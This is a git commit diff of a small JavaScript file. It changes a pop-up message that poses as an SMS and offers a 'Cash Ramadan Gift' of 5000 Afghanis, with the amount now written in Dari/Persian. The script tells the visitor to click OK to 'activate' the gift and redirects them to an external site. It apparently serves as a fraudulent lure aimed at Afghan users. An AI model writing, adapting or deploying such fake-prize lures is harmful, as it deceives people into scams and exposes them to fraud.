2ae140a6a5dc4acafbdefc48113a702aff8444ae
usorondo16 <curtsy.walk6p@icloud.com>
2026-02-21 13:18:39 +0100

    Update aziziram.js

--- aziziram.js
+++ aziziram.js
@@ -1,5 +1,5 @@
-var password = 'AFN5000'
-password = prompt('SMS: Congratulations, your are eligible to AFN5000 Cash Ramadan Gift From , click OK to activate now','AFN5000');
-if (password != 'AFN5000') {
-    location.href ='https://www.inaaekou.site/afn5000-ramadan';
+var password = 'برداشت 5000 افغانی'
+password = prompt('SMS: Congratulations, your are eligible to برداشت 5000 افغانی Cash Ramadan Gift From , click OK to activate now','برداشت 5000 افغانی');
+if (password != 'برداشت 5000 افغانی') {
+    location.href ='https://www.inaaekou.site/برداشت 5000 افغانی-ramadan';
 }
